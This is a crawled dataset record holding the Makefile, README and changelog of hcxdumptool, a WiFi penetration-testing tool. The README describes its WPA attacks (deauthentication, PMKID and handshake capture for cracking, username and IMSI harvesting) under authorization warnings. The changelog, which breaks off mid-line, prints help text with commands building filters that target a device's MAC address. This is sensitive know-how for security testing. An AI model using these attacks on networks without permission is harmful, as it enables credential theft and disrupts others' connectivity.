{
  "metadata": {
    "timestamp": 1736710099769,
    "page": 719,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjcyMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "ZerBea/hcxdumptool",
      "stars": 1881,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.01171875,
          "content": "hcxdumptool\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 1.6533203125,
          "content": "PRODUCTION\t\t:= 0\nPRODUCTION_VERSION\t:= 6.3.5\nPRODUCTION_YEAR\t\t:= 2025\n\nifeq ($(PRODUCTION),1)\nVERSION_TAG\t\t:= $(PRODUCTION_VERSION)\nelse\nVERSION_TAG\t\t:= $(shell git describe --tags || echo $(PRODUCTION_VERSION))\nendif\nVERSION_YEAR\t\t:= $(shell echo $(PRODUCTION_YEAR))\n\nPREFIX\t\t?= /usr\nBINDIR\t\t= $(DESTDIR)$(PREFIX)/bin\n\nHOSTOS\t\t:= $(shell uname -s)\n\nCC\t\t?= gcc\nCFLAGS\t\t?= -O3 -Wall -Wextra -Wpedantic\nCFLAGS\t\t+= -std=gnu99\n# uncomment to enable DEBUG symbols\n#CFLAGS\t\t+= -ggdb -fsanitize=address\nDEFS\t\t= -DVERSION_TAG=\\\"$(VERSION_TAG)\\\" -DVERSION_YEAR=\\\"$(VERSION_YEAR)\\\"\n# comment to disable STATUS display (headless operation)\nDEFS\t\t+= -DHCXSTATUSOUT\n# comment to disable GPS support\nDEFS\t\t+= -DHCXNMEAOUT\n# uncomment to enable BPF compiler\nDEFS\t\t+= -DHCXWANTLIBPCAP\nLDFLAGS\t+= -lpcap\n# uncomment to enable DEBUG log\n#DEFS\t\t+= -DHCXDEBUG\n\nINSTALL\t\t?= install\nINSTFLAGS\t=\n\nifeq ($(HOSTOS), Linux)\nINSTFLAGS += -D\nendif\n\n\nTOOLS=hcxdumptool\n\n.PHONY: all build install clean uninstall\n\nall: build\n\nbuild: $(TOOLS)\n\n# $1: tool name\ndefine tool-build\n$(1)_src ?= $(1).c\n$(1)_libs ?=\n$(1)_cflags ?=\n\n$(1): $$($(1)_src)\n\t$$(CC) $$(CFLAGS) $$($(1)_cflags) $$(CPPFLAGS) -o $$@ $$($(1)_src) $$(DEFS) $$(LDFLAGS)\n\n.deps/$(1).d: $(1)\n\n.PHONY: $(1).install\n$(1).install: $(1)\n\t$$(INSTALL) $$(INSTFLAGS) -m 0755 $(1) $$(BINDIR)/$(1)\n\n.PHONY: $(1).clean\n$(1).clean:\n\trm -f .deps/$(1).d\n\trm -f $(1)\n\n.PHONY: $(1).uninstall\n$(1).uninstall:\n\trm -rf $$(BINDIR)/$(1)\n\nendef\n\n$(foreach tool,$(TOOLS),$(eval $(call tool-build,$(tool))))\n\ninstall: $(patsubst %,%.install,$(TOOLS))\n\nclean: $(patsubst %,%.clean,$(TOOLS))\n\trm -rf .deps\n\trm -f *.o *~\n\nuninstall: $(patsubst %,%.uninstall,$(TOOLS))\n\n-include .deps/*.d\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 13.001953125,
          "content": "# hcxdumptool\n\nA tool to capture packets from WLAN devices and to discover potential weak points within own WiFi networks by running layer 2 attacks against the WPA protocol.\n\nDesigned to to run (mostly headless) on small systems like a Raspberry Pi Zero.\n\n### General Information\n\n- [An overview of Hashcat mode 22000.](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)\n\n- [A set of tools by **ZerBea** intended for processing capture files.](https://github.com/ZerBea/hcxtools)\n\n- [Old but still applicable write-up by **atom** of the Hashcat forums covering a new attack on WPA/WPA2 using PMKID.](https://hashcat.net/forum/thread-7717.html)\n\n- [Hashcat mode 22000 write-up by **atom** of the Hashcat forums.](https://hashcat.net/forum/thread-10253.html)\n\n- [A write-up by **Ido Hoorvitch** from CyberArk covering the statistics of WPA/WPA2 password cracking.](https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick)\n\n- [A section of this README that covers hcxdumptool's abilities and the responsibilities of using it.](https://github.com/ZerBea/hcxdumptool#caution)\n\n- hcxdumptool uses the modern [pcapng](https://pcapng.com/) format, allowing for use with wireshark or tshark.\n\n- [A document showcasing an example attack using hcxdumptool and hcxtools.](https://github.com/ZerBea/hcxdumptool/blob/master/docs/example.md)\n\n### What Doesn't hcxdumptool Do?\n\n- It does not crack WPA PSK related hashes. (Use Hashcat or JtR to recover the PSK.)\n\n- It does not crack WEP. (Use the aircrack-ng suite instead.)\n\n- It does not crack WPS. (Use Reaver or Bully instead.)\n\n- It does not decrypt encrypted traffic. (Use tshark or Wireshark in parallel.)\n\n- It does not record all traffic captured on the WLAN device. (Use tshark or Wireshark in parallel.)\n\n- It does not perform Evil Twin attacks.\n\n- It does not provide a beautiful status display.\n\n- It is not a honey pot.\n\n**Unsupported:** Windows OS, macOS, Android, emulators or wrappers!\n\n> [!NOTE]\n>\n> **hcxdumptool** does not perform conversion or cracking! It is designed to be used in conjunction with the following tools:\n>\n> | Tool          | Description                                                                                           |\n> | ------------- | ------------------------------------------------------------------------------------------------------|\n> | hcxpcapngtool | Tool to convert raw PCAPNG files to Hashcat and JtR readable formats. (hcxtools)                      |\n> | hcxhashtool   | Tool to filter hashes from HC22000 files based on user input. (hcxtools)                              |\n> | hcxpsktool    | Tool to get weak PSK candidates from HC22000 files. (hcxtools)                                        |\n> | hcxeiutool    | Tool to calculate wordlists based off ESSIDs gathered. (hcxtools)                                     |\n> | Hashcat/JtR   | Third party tools used to infer PSK from HC22000 hash files.                                          |\n>\n> **hcxtools** can be found [here](https://github.com/ZerBea/hcxtools). Hashcat can be found [here](https://github.com/hashcat/hashcat).\n\n### Work Flow\n\nhcxdumptool -> hcxpcapngtool -> hcxhashtool (additional hcxpsktool/hcxeiutool) -> Hashcat or JtR\n\n### Requirements\n\n- Knowledge of radio technology.\n- Knowledge of electromagnetic-wave engineering.\n- Detailed knowledge of 802.11 protocol.\n- Detailed knowledge of key derivation functions.\n- Detailed knowledge of Linux.\n- Detailed knowledge of filter procedures. (Berkeley Packet Filter, capture filter, display filter, etc.)\n- Detailed knowledge of Bolean Operators.\n- Operating system: Linux (latest longterm or stable [kernel](https://www.kernel.org), mandatory >= 5.15)\n- Recommended distribution: [Arch Linux](https://archlinux.org/) (notebooks and desktop systems), [OpenWRT](https://openwrt.org/) (small systems like Raspberry Pi, WiFi router)\n- WLAN device chipset must be able to run in monitor mode.\n- WLAN device driver *must* support monitor and full frame injection mode.\n- gcc >= 14 recommended (deprecated versions are not supported: https://gcc.gnu.org/)\n- make\n- libpcap and libpcap-dev (If internal BPF compiler has been enabled.)\n- Raspberry Pi A, B, A+, B+, Zero (WH). (Recommended: Zero or A+, because of a very low power consumption), but notebooks and desktops will work as well.\n- GPIO hardware mod recommended (push button and LED) on Raspberry Pi\n- To allow 5/6/7GHz packet injection, it is mandatory to uncomment a regulatory domain that support this: /etc/conf.d/wireless-regdom \n- Make sure that the version of hcxdumptool always fits to the version of hcxpcapngtool \n\n### Install Guide\n\n> [!IMPORTANT]\n>\n> While hcxdumptool and hcxtools are available through the package manager on most distributions, these packages are usually very old and outdated, thus cloning and building is recommended. \n>\n> Make sure that your distribution is updated to it's latest version and make sure that all header files and dependencies have been installed BEFORE attempting to compile!\n>\n> The packages mentioned in the \"Requirements\" section sometimes come under different names in a package manager! Make sure to install the correct packages!\n\n#### Clone Repository\n\n```\ngit clone https://github.com/ZerBea/hcxdumptool.git\ncd hcxdumptool\n```\n\n#### Compile & Install\n\nCompiling:\n```\nmake -j $(nproc)\n```\n\nInstalling to `/usr/bin`:\n```\nmake install (as super user)\n```\n\nOr installing to `/usr/local/bin`:\n```\nmake install PREFIX=/usr/local (as super user)\n```\n\n> [!TIP]\n>\n> On headless operation, remove -DSTATUSOUT from the Makefile before compiling! That way, the status display will not be compiled. This will save CPU cycles and prevent ERRORs from occurring.\n>\n> It is theoretically possible to compile hcxdumptool for other systems (e.g. Android) and other distributions (e.g. KALI) and other operating systems (BSD) as well.\n> There is no plan to support the operating systems and feature requests will be rejected.\n\n### Adapters\n\n> [!WARNING]\n>\n> - Do not expect flawless drivers on brand new hardware!\n>\n> - Driver must support monitor mode and full packet injection!\n>\n> - PRISM devices are _not_ supported! \n>\n> - WIRELESS EXTENSIONS are deprecated and no longer supported!\n\n> [!NOTE]\n>\n> Manufacturers do change chipsets without changing model numbers. Sometimes they add (v)ersion or (rev)vision.\n> As long as a manufacturer or a company does not consider it necessary to supply drivers to the Linux kernel avoid to buy this products!\n>\n> **Always verify the actual chipset with 'lsusb' and/or 'lspci'!**\n>\n> No support for a third party driver which is not part of the [official Linux kernel](https://www.kernel.org/).\n> Report related issues to the site, from which you downloaded the driver.\n>\n> No support for a driver which doesn't support monitor mode and full frame injection natively.\n> If you need these features, do a request on www.kernel.org\n>\n> Several device and driver tests can be found [here](https://github.com/ZerBea/hcxdumptool/discussions/361).\n> Dependent on the version of the Linux kernel, expect massive driver issues.\n\nKnown as working WiFi chipsets:\n\n* Atheros (ath9k_htc) old chipset\n\n* Ralink (rt2800usb) old chipset\n\n* MediaTek (mt76) depending on chipset and the version of the Linux Kernel expect massive driver issues\n\n* Realtek (rtl8xxxu) depending on chpset and the version of the Linux Kernel expect massive driver issues\n\nNot recommended WiFi chipsets:\n\n* Intel (Monitor mode and frame injection problems.)\n\n* Broadcom (Neither monitor mode nor frame injection by official Linux kernel.)\n\n* Qualcomm (No frame injection by official Linux kernel.)\n\nMore information about possible issues or limitations can be found [here](https://github.com/ZerBea/hcxdumptool#useful-links).\n\n### Antennas\n\nThe best high frequency amplifier is a good antenna!\n\nIt is much better to achieve gain using a good antenna instead of increasing transmission power.\n\n| VENDOR MODEL           | TYPE            |\n| ---------------------- | --------------- |\n| LOGILINK WL0097        | Grid Parabolic  |\n| TP-LINK TL-ANT2414 A/B | Panel           |\n| LevelOne WAN-1112      | Panel           |\n| DELOCK 88806           | Panel           |\n| TP-LINK TL-ANT2409 A   | Panel           |\n\n### GPS devices (NMEA 0183 protocol)\n\n| VENDOR MODEL                | TYPE            |\n| --------------------------- | --------------- |\n| NAVILOCK NL-701US           | USB             |\n| JENTRO BT-GPS-8 activepilot | BLUETOOTH       |\n| HiLetgo VK172               | USB             |\n\n### Useful Scripts\n\n| Script       | Description                                              |\n| ------------ | -------------------------------------------------------- |\n| stopnm       | Example script to stop NetworkManager                    |\n| startnm      | Example script to start NetworkManager                   |\n| startnlmon   | Example script to activate NETLINK monitor               |\n\n### Caution!\n\nYou might expect me to recommend that everyone should be using hcxdumptool/hcxtools. But the fact of the matter is, hcxdumptool/hcxtools is _NOT_ recommended to be used by inexperienced users or newbies.\n\nIf you are not familiar with Linux in general or you do not have at least a basic level of knowledge as mentioned in the \"Requirements\" section, hcxdumptool/hcxtools is probably not what you are looking for.\nHowever, if you have that knowledge hcxdumptool/hcxtools can do magic for you.\n\nMisuse of hcxdumptool within a network, particularly without authorization, may cause irreparable damage and result in significant consequences. “Not understanding what you were doing” is not going to work as an excuse.\n\nThe entire toolkit (hcxdumptool and hcxtools) is designed to be an analysis toolkit. \n\n**hcxdumptool should only be used in a 100% controlled environment!**\n\nIf you can't control the environment, it is absolutely mandatory to set the [BPF](https://wiki.wireshark.org/CaptureFilters)!\n\nThe BPF can be used to select a target (or multible targets) or to protect devices.\n\nBy default, hcxdumptool is utilizing three attack vectors:\n\n- Connecting to an ACCESS POINT to get a PMKID (turn off by --attemptapmax)\n\n- Disconnecting a CLIENT from an associated ACCESS POINT to get a complete handshake (M1M2M3M4) and a PMKID (turn off by --attemptapmax)\n\n- Allowing a CLIENT to connect to hcxdumptool to get a challenge (M1M2) or an EAP-ID (turn off by --attemptclientmax)\n\n> [!WARNING]\n>\n> **You may only use hcxdumptool on networks that you have permission to attack, because:**\n>\n> - hcxdumptool is able to prevent complete WLAN traffic transmission. (Depending on selected options.)\n>\n> - hcxdumptool is able to capture PMKIDs from access points if the accesspoint supports PMKID caching. (Only one single PMKID from an access point is required. Use hcxpcapngtool to convert them to a format Hashcat or JtR understands.)\n>\n> - hcxdumptool is able to capture handshakes from non-connected clients. (Only one single M2 from the client is required. Use hcxpcapngtool to convert them to a format Hashcat or JtR understands.)\n>\n> - hcxdumptool is able to capture handshakes from 5/6GHz clients on 2.4GHz. (Only one single M2 from the client is required. Use hcxpcapngtool to convert to a format Hashcat or JtR understands.)\n>\n> - hcxdumptool is able to capture passwords from the WLAN traffic. (Use hcxpcapngtool -R to save them to file, or together with networknames [-E].)\n>\n> - hcxdumptool is able to request and capture extended EAPOL. (RADIUS, GSM-SIM, WPS. hcxpcapngtool will show you information about them.)\n>\n> - hcxdumptool is able to capture identities from the WLAN traffic. (Example: Request IMSI numbers from mobile phones - use hcxpcapngtool -I to save them to file.)\n>\n> - hcxdumptool is able to capture usernames from the WLAN traffic. (Example: User name of a server authentication - use hcxpcapngtool -U to save them to file.)\n>\n> **Do Not:**\n>\n> - Use a logical interface and leave the physical interface in managed mode!\n>\n> - Use hcxdumptool in combination with the aircrack-ng suite, Reaver, Bully, or any other tools that take access to the interface!\n>\n> - Use tools like macchanger as they are useless since hcxdumptool uses its own random MAC address space.\n>\n> - Merge PCAPNG dumpfiles because doing so will destroy custom block hash assignments!\n\n### Useful Links\n\n- [PCAPNG Format Information](https://pcapng.com/)\n\n- [The Linux Kernel Documentation](https://www.kernel.org/doc/html/latest/)\n\n- [Existing Linux Wireless drivers](https://wireless.docs.kernel.org/en/latest/en/users/drivers.html)\n\n- [BPF Documentation](https://www.kernel.org/doc/html/latest/bpf/index.html)\n\n- [Linux Commands Handbook](https://www.freecodecamp.org/news/the-linux-commands-handbook/)\n\n- [WPA2 Information](https://en.wikipedia.org/wiki/Wpa2)\n\n- [802.11 Frame Types](https://en.wikipedia.org/wiki/802.11_Frame_Types)\n\n- [802.11 Security Improvements](https://en.wikipedia.org/wiki/IEEE_802.11i-2004)\n\n- [Kernel Bugzilla](https://bugzilla.kernel.org)\n\n- [About ath10k](https://wireless.wiki.kernel.org/en/users/Drivers/ath10k)\n\n- [Status of Realtek out-of-kernel Drivers](https://github.com/morrownr/USB-WiFi/issues/314)\n\n- [PCAPNG Status Options](https://github.com/ZerBea/hcxdumptool/blob/master/docs/option-codes.md)\n"
        },
        {
          "name": "changelog",
          "type": "blob",
          "size": 94.5322265625,
          "content": "11.11.2024\n==========\nrelease v6.3.5\nbetter compatibility with OpenWRT\nseveral fixes\n\n\n04.03.2024\n==========\nREADME.md: removed entire instructions how to compile hcxdumptool on different distributions\n           check the distribution's page how to update the ditribution, how to install missing dependencies and missing header files\n\n\n25.02.2024\n==========\nrelease v6.3.4\nrelease v6.3.3\ninternal BPFC compiler enabled by default\nnew dependency libpcap\n\n\n04.02.2024\n==========\nhcxdumptool: changed bit mask order of exitoneapol\n--exitoneapol=<type>      : exit on first EAPOL occurrence:\n                             bitmask:\n                              1 = PMKID (from AP)\n                              2 = EAPOL M2M3 (authorized)\n                              4 = EAPOL M1M2/M1M2ROGUE (not authorized)\n                              8 = EAPOL M1\n\n\n06.01.2024\n==========\nhcxdumptool: changed option --beacon_off to --disable_beacon\n\n\n04.12.2023\n==========\nhcxdumptool: allow to set monitor mode (-m) in combination with channel (-c) or frequency (-f)\n\n\n28.12.2023\n==========\nhcxdumptool: do not spam channel with retries\n             changed SNAPLEN\n\n\n22.12.2023\n==========\nhcxdumptool: added BE support\n             removed option beacontx\n--beaconoff  : disable internal BEACON (one BEACON/second to wildcard SSID)\n\n\n08.12.2023\n==========\nSome drivers report incorrectly active monitor mode capability.\nhcxdumptool: do not set active monitor mode by default if driver report that it is possible\n             removed option -p\n             added new option -A in case active monitor mode is working as expected\n             -A             : ACK incoming frames\n                               INTERFACE must support active monitor mode\n\n\n28.11.2023\n==========\nhcxdumptool: added full featured BPF compiler\n             due to additional dependency (libpcap and libpcap-dev) this feature must be enabled in Makefile\n             added PROBEREQUEST counter to rcascan mode\n             added option to sort rcascan display by PROBEREQUEST counter\n\n\n27.11.2023\n==========\nhcxdumptool: accept Berklev Packet filter code in tcpdump raw format and in tcpdump c style format\n-bpf=<file>   : input Berkeley Packet Filter (BPF) code (maximum 4096 instructions)\n                  in tcpdump raw format:\n                   example: tcpdump high level compiler:\n                    $ tcpdump -s 65535 -y IEEE802_11_RADIO wlan addr3 11:22:33:44:55:66 -ddd > filter.bpf\n                    see man pcap-filter\n                   eample: bpf_asm low level compiler\n                    $ bpf_asm filter.asm | tr ',' '\\n' > filter.bpf\n                    see https://www.kernel.org/doc/html/latest/networking/filter.html\n                   example: bpfc low level compiler:\n                    $ bpfc -f tcpdump -i filter.asm > filter.bpf\n                    see man bpfc\n                  in tcpdump c style format:\n                   example: tcpdump high level compiler:\n                    $ tcpdump -s 65535 -y IEEE802_11_RADIO wlan addr3 11:22:33:44:55:66 -dd > filter.bpf\n                    see man pcap-filter\n                   example: bpfc low level compiler:\n                    $ bpfc -f C -i filter.asm > filter.bpf\n                    see man bpfc\n\n\n01.11.2023\n==========\nrelease v6.3.2\n\n\n23.10.2023\n==========\nhcxdumptool: removed option \"disable_beacon\" because it is replaced by option beacontx=0\n\n\n01.09.2023\n==========\nhcxdumptool: added new option to get shart and greppable interface list\n\n\n26.07.2023\n==========\nhcxdumptool: added compile time information to version information\n\n$ hcxdumptool -v\nhcxdumptool 6.3.1-35-g1a0930e (C) 2023 ZeroBeat\ncompiled by gcc 13.1.1\nLinux API headers 6.3.0\ncompiled with glibc 2.37\n\nUnder normal circumstances, the Linux kernel version could be\ngreater than the \"Linux API headers\" version, but never less.\n\n\n24.07.2023\n==========\nhcxdumptool: added new option to EXIT on EAPOL\n--exitoneapol=<type>           : exit on first EAPOL occurrence:\n                                  bitmask:\n                                   1 = PMKID\n                                   2 = EAPOL M2\n                                   4 = EAPOL M3\n                                  target BPF filter is recommended\nget more information here:\nhttps://github.com/ZerBea/hcxdumptool/issues/333#issuecomment-1647684235\n\n\n03.07.2023\n==========\nadded -Wpedantic to compiler flags and fixed all warnings\n\n\n30.06.2023\n==========\nrelease v6.3.1\n\n\n09.05.2023\n==========\nhcxdumptool: added option to remove active monitor flag\n-p             : do not set monitor mode: active (do not ACK incoming frames addressed to the device MAC\n                 default monitor mode: active (ACK all incoming frames addresed to the device MAC)\n\nThis is a workaround on mt7601u devices/drivers.\nRunning active monitor mode, only frames addressed to the MAC of the device\nor addressed to BROADCAST MAC are received. This is a driver/firmware problem!\nTo verify if you are affected:\nrun hcxdumptool\nrun Wireshark in parallel and set filter option to \"eapol\"\nif Wireshark only show EAPOL M1 frames it is mandatory to disable active monitor mode\nby option \"-p\"\n\nProblem is reported here:\nhttps://bugzilla.kernel.org/show_bug.cgi?id=217465\n\n\n06.05.2023\n==========\nhcxdumptool: added option to save GPS information to pcapng dumpfile\n--nmea_pcapng                  : write GPS information to pcapng dump file\n\n\n05.05.2023\n==========\nrelease v6.3.0\n\nSince kernel 6.3 Kernel developer decided to print a dmesg warning if tools are detected that use deprecated WEXT:\n[ 2770.939021] warning: `hcxdumptool' uses wireless extensions which will stop working for Wi-Fi 7 hardware; use nl80211\nhcxdumptool used ioctl(SIOCGIWNAME) to detect presence of WEXT. That was the last remnant of WEXT code.\nTo get rid of this dmesg warning, this detection has been removed by latest commit.\n\n\n03.05.2023\n==========\nhcxdumptool: changed/added several options:\n$ hcxdumptool --help\nhcxdumptool 6.2.9-161-gf581815  (C) 2023 ZeroBeat\nusage: hcxdumptool <options>\n        first stop all services that take access to the interface, e.g.:\n        $ sudo systemctl stop NetworkManager.service\n        $ sudo systemctl stop wpa_supplicant.service\n        then run hcxdumptool\n        press ctrl+c to terminate\n        press GPIO button to terminate\n        hardware modification is necessary, read more:\n        https://github.com/ZerBea/hcxdumptool/tree/master/docs\n        stop all services (e.g.: wpa_supplicant.service, NetworkManager.service) that take access to the interface\n        do not set monitor mode by third party tools (iwconfig, iw, airmon-ng)\n        do not use logical (NETLINK) interfaces (monx, wlanxmon, prismx, ...) created by airmon-ng and iw\n        do not use virtual machines or emulators\n        do not run other tools that take access to the interface in parallel (except: tshark, wireshark, tcpdump)\n        do not use tools to change MAC (like macchanger)\n        do not merge (pcapng) dump files, because this destroys assigned hash values!\n\nshort options:\n-i <INTERFACE> : name of INTERFACE to be used\n                  default: first suitable INTERFACE\n                  warning: hcxdumptool changes the virtual MAC address of the INTERFACE\n-w <outfile>   : write packets to a pcapng-format file named <outfile>\n                  default outfile name: yyyyddmmhhmmss-interfacename.pcapng\n                  get more information: https://pcapng.com/\n-c <digit>     : set channel (1a,2a,36b...)\n                  default: 1a,6a,11a\n                  important notice: channel numbers are not unique\n                  it is mandatory to add band information to the channel number (e.g. 12a)\n                   band a: NL80211_BAND_2GHZ\n                   band b: NL80211_BAND_5GHZ\n                   band c: NL80211_BAND_6GHZ\n                   band d: NL80211_BAND_60GHZ\n                   band e: NL80211_BAND_S1GHZ (902 MHz)\n                  to disable frequency management, set this option to a single frequency/channel\n-f <digit>     : set frequency (2412,2417,5180,...)\n-F             : use available frequencies from INTERFACE\n-t <second>    : minimum stay time (will increase on new stations and/or authentications)\n                  default 1 seconds\n-m <INTERFACE> : set monitor mode and terminate\n-L             : show INTERFACE list\n-I <INTERFACE> : show detailed information about INTERFACE\n-h             : show this help\n-v             : show version\n\nlong options:\n--bpf=<file>                   : input kernel space Berkeley Packet Filter (BPF) code\n                                  steps to create a BPF (it only has to be done once):\n                                  $ hcxdumptool -m <interface>\n                                  create BPF to protect MACs\n                                  $ tcpdump -i <INTERFACE> not wlan addr2 11:22:33:44:55:66 -ddd > protect.bpf\n                                  recommended to protect own devices\n                                  create BPF to attack a MAC\n                                  $ tcpdump -i <INTERFACE> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 or wlan addr3 11:22:33:44:55:66 -ddd > attack.bpf\n                                  it is strongly recommended to allow all PROBEREQUEST frames (wlan_type mgt && wlan_subtype probe-req)\n                                  $ tcpdump -i <interface> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 or wlan addr3 11:22:33:44:55:66 or wlan addr3 ff:ff:ff:ff:ff:ff -ddd > attack.bpf\n                                  see man pcap-filter for a list of all filter options\n                                  add BPF code: \n                                  $ hcxdumptool -i <INTERFACE> --bpf=attack.bpf ...\n--disable_beacon               : do not transmit BEACON frames\n--disable_deauthentication     : do not transmit DEAUTHENTICATION/DISASSOCIATION frames\n--disable_proberequest         : do not transmit PROBEREQUEST frames\n--disable_association          : do not AUTHENTICATE/ASSOCIATE\n--disable_reassociation        : do not REASSOCIATE a CLIENT\n--beacontx=<digit>             : transmit BEACON of first n entries of ESSID list\n                                 default: 10\n--proberesponsetx=<digit>      : transmit PROBERESPONSEs of first n entries of ESSID list\n                                 default: 10\n--essidlist=<file>             : initialize ESSID list with these ESSIDs\n--errormax=<digit>             : set maximum allowed ERRORs\n                                 default: 100 ERRORs\n--watchdogmax=<seconds>        : set maximum TIMEOUT when no packets received\n                                 default: 600 seconds\n--attemptclientmax=<digit>     : set maximum of attempts to request an EAPOL M2\n                                 default: 10 attempts\n--attemptapmax=<digit>         : set maximum of received BEACONs to request a PMKID or to get a 4-way handshake\n                                 default: stop after 4 received BEACONs\n--tot=<digit>                  : enable timeout timer in minutes\n--onsigterm=<action>           : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                  reboot:   reboot system\n--ongpiobutton=<action>        : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                  reboot:   reboot system\n--ontot=<action>               : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                  reboot:   reboot system\n--onwatchdog=<action>          : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                  reboot:   reboot system\n--onerror=<action>             : action when the program has been terminated (poweroff, reboot)\n                                  poweroff: power off system\n                                  reboot:   reboot system\n--gpio_button=<digit>          : Raspberry Pi GPIO pin number of button (2...27)\n                                  push GPIO button (> 10 seconds) to terminate program\n                                  default: 0 (GPIO not in use)\n--gpio_statusled=<digit>       : Raspberry Pi GPIO number of status LED (2...27)\n                                  default: 0 (GPIO not in use)\n--nmea_dev=<NMEA device>       : open NMEA device (/dev/ttyACM0, /dev/tty/USB0, ...)\n                                  baudrate = BD9600\n--gpsd                         : use gpsd to get position\n                                  gpsd will be switched to NMEA0183 mode\n--nmea_out=<outfile>           : write GPS information to a nmea-format file named <outfile>\n                                  default outfile name: yyyymmddhhmmss.nmea\n                                  output: NMEA 0183 standard messages:\n                                          $GPRMC: Position, velocity, time and date\n                                          $GPGGA: Position, orthometric height, fix related data, time\n                                          $GPWPL: Position and MAC AP\n                                          $GPTXT: ESSID in HEX ASCII\n                                  use gpsbabel to convert to other formats:\n                                   gpsbabel -w -t -i nmea -f in_file.nmea -o gpx -F out_file.gpx\n                                   gpsbabel -w -t -i nmea -f in_file.nmea -o kml -F out_file.kml\n                                  get more information: https://en.wikipedia.org/wiki/NMEA_0183\n--rcascan=<character>          : do (R)adio (C)hannel (A)ssignment scan\n                                  default = passive scan\n                                  a = active scan\n                                  p = passive scan\n--rds=<digit>                  : sort real time display\n                                  default: sort by time (last seen on top)\n                                  1 = sort by status (last PMKID/EAPOL on top)\n--help                         : show this help\n--version                      : show version\n\nLegend\nreal time display:\n R = + AP display:     AP is in TX range or under attack\n S = + AP display:     AUTHENTICATION KEY MANAGEMENT PSK\n P = + AP display:     got PMKID\n 1 = + AP display:     got EAPOL M1 (CHALLENGE)\n 3 = + AP display:     got EAPOL M1M2M3 (AUTHORIZATION)\n E = + CLIENT display: got EAP-START MESSAGE\n 2 = + CLIENT display: got EAPOL M1M2 (ROGUE CHALLENGE)\nNotice:\nThis is a penetration testing tool!\nIt is made to detect vulnerabilities in your NETWORK mercilessly!\nTo store entire traffic, run <tshark -i <interface> -w allframes.pcapng> in parallel\n\n\n19.04.2023\n==========\nhcxdumptool: changed rcascan\n--rcascan=<character>          : do (R)adio (C)hannel (A)ssignment scan\n                                  default = passive scan\n                                  a = active scan\n                                  p = passive scan\n\n\n14.04.2023\n==========\nhcxdumptool: added new option to sort status display\n--rds=<digit>                  : sort real time display\n                                  default: sort by time (last seen on top)\n                                  1 = sort by status (last PMKID/EAPOL on top)\n\n\n07.04.2023\n==========\nremoved obsolete hcxpioff\nrefactored hcxdumptool: replaced entire hcxdumptool code by hcxlabtool code\n\n$ hcxdumptool --help\nhcxdumptool 6.2.9-22-gace924f  (C) 2023 ZeroBeat\nusage: hcxdumptool <options>\n        first stop all services that take access to the interface , e.g.:\n        $ sudo systemctl stop NetworkManager.service\n        $ sudo systemctl stop wpa_supplicant.service\n        than run hcxdumptool\n        press ctrl+c to terminate\n        press GPIO button to terminate\n        hardware modification is necessary, read more:\n        https://github.com/ZerBea/hcxdumptool/tree/master/docs\n        do not set monitor mode by third party tools (iwconfig, iw, airmon-ng)\n        do not use logical (NETLINK) interfaces (monx, wlanxmon, prismx, ...) created by airmon-ng and iw\n        do not use virtual machines or emulators\n        do not run other tools that take access to the interface in parallel (except: tshark, wireshark, tcpdump)\n        do not use tools to change MAC (like macchanger)\n        stop all services (e.g.: wpa_supplicant.service, NetworkManager.service) that take access to the interface\n\nshort options:\n-i <INTERFACE> : name of INTERFACE to be used\n                  default: first suitable INTERFACE\n                  warning: hcxdumptool changes the virtual MAC address of the INTERFACE\n-w <outfile>   : write packets to a pcapng-format file named <outfile>\n                  default outfile name: yyyyddmmhhmmss-interfacename.pcapng\n                  get more information: https://pcapng.com/\n-c <digit>     : set channel (1a,2a,36b...)\n                  default: 1a,6a,11a\n                  important notice: channel numbers are not unique\n                  it is mandatory to add band information to the channel number (e.g. 12a)\n                   band a: NL80211_BAND_2GHZ\n                   band b: NL80211_BAND_5GHZ\n                   band c: NL80211_BAND_6GHZ\n                   band d: NL80211_BAND_60GHZ\n                   band e: NL80211_BAND_S1GHZ (902 MHz)\n                  to disable frequency management, set this option to a single frequency/channel\n-f <digit>     : set frequency (2412,2417,5180,...)\n-F             : use available frequencies from INTERFACE\n-t <second>    : minimum stay time (will increase on new stations and/or authentications\n                  default 1 seconds\n-m <INTERFACE> : set monitor mode and terminate\n-L             : show INTERFACE list\n-I <INTERFACE> : show detailed information about INTERFACE\n-h             : show this help\n-v             : show version\n\nlong options:\n--bpf=<file>                   : input kernel space Berkeley Packet Filter (BPF) code\n                                  steps to create a BPF (it only has to be done once):\n                                  $ hcxdumptool -m <interface>\n                                  create BPF to protect MACs\n                                  $ tcpdump -i <INTERFACE> not wlan addr2 11:22:33:44:55:66 -ddd > protect.bpf\n                                  recommended to protect own devices\n                                  create BPF to attack a MAC\n                                  $ tcpdump -i <INTERFACE> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 or wlan addr3 11:22:33:44:55:66 -ddd > attack.bpf\n                                  it is strongly recommended to allow all PROBEREQUEST frames (wlan_type mgt && wlan_subtype probe-req)\n                                  $ tcpdump -i <interface> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 or wlan addr3 11:22:33:44:55:66 or wlan addr3 ff:ff:ff:ff:ff:ff -ddd > attack.bpf\n                                  see man pcap-filter for a list of all filter options\n                                  add BPF code: \n                                  $ hcxdumptool -i <INTERFACE> --bpf=attack.bpf ...\n--disable_beacon               : do not transmit BEACON frames\n--disable_deauthentication     : do not transmit DEAUTHENTICATION/DISASSOCIATION frames\n--disable_proberequest         : do not transmit PROBEREQUEST frames\n--disable_association          : do not AUTHENTICATE/ASSOCIATE\n--disable_reassociation        : do not REASSOCIATE a CLIENT\n--beacontx=<digit>             : transmit BEACON of first n entries of ESSID list\n                   